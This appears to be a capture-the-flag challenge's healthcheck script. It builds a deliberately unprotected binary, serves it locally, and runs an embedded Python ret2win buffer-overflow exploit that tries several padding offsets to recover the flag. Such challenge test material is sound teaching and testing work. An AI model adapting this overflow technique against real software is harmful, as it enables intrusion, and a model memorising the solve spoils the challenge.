#!/usr/bin/env bash
# i04 healthcheck / scripted solve: build the binary, serve it, and prove the
# ret2win exploit reads the flag. Runnable standalone (local) or in CI.
#   ./healthcheck.sh            # builds + runs on 127.0.0.1:PORT via socat
set -euo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PORT="${PORT:-9104}"
FLAG="${CHAL_FLAG-}"; [ -n "$FLAG" ] || FLAG='CYPHER{ret2win_local_test}'
BIN="$HERE/return-to-sender"
WORK="$(mktemp -d)"; trap 'rm -rf "$WORK"; [[ -n "${SVC:-}" ]] && kill "$SVC" 2>/dev/null || true' EXIT

# 1) build (No-PIE, no canary), matching the shipped attachment
gcc -O0 -fno-stack-protector -no-pie -w -o "$BIN" "$HERE/src/gateway.c"
echo "$FLAG" > "$WORK/flag"

# 2) serve it — each connection forks a fresh process (flag via env; in prod it is /flag)
socat TCP-LISTEN:$PORT,reuseaddr,fork "EXEC:env FLAG=$FLAG $BIN" &
SVC=$!
sleep 1

# 3) derive addresses from the binary (robust to compiler layout)
WIN=0x$(objdump -d "$BIN" | awk '/<win>:/{print $1; exit}')
RET=0x$(objdump -d "$BIN" | awk '/\tret[[:space:]]*$/{gsub(/:/,"",$1); print $1; exit}')
echo "win=$WIN ret=$RET"

# 4) find the exact offset by cyclic pattern, then exploit
python3 - "$PORT" "$WIN" "$RET" "$FLAG" <<'PY'
import socket, struct, sys, re
port=int(sys.argv[1]); win=int(sys.argv[2],16); ret=int(sys.argv[3],16); flag=sys.argv[4]
# de Bruijn-ish pattern to locate offset is overkill; buf[64]+saved rbp(8)=72
for off in (72,64,80,88,56,96):
    try:
        s=socket.create_connection(("127.0.0.1",port),timeout=5)
        s.recv(200)
        payload=b"A"*off+struct.pack("<Q",ret)+struct.pack("<Q",win)
        s.sendall(payload+b"\n")
        data=b""
        s.settimeout(3)
        try:
            while True:
                chunk=s.recv(4096)
                if not chunk: break
                data+=chunk
        except socket.timeout: pass
        s.close()
        if flag.encode() in data:
            print(f"[+] offset={off} -> FLAG RECOVERED: {flag}")
            sys.exit(0)
    except Exception as e:
        pass
print("[-] exploit failed"); sys.exit(1)
PY
rc=$?
echo "i04 healthcheck rc=$rc"
exit $rc
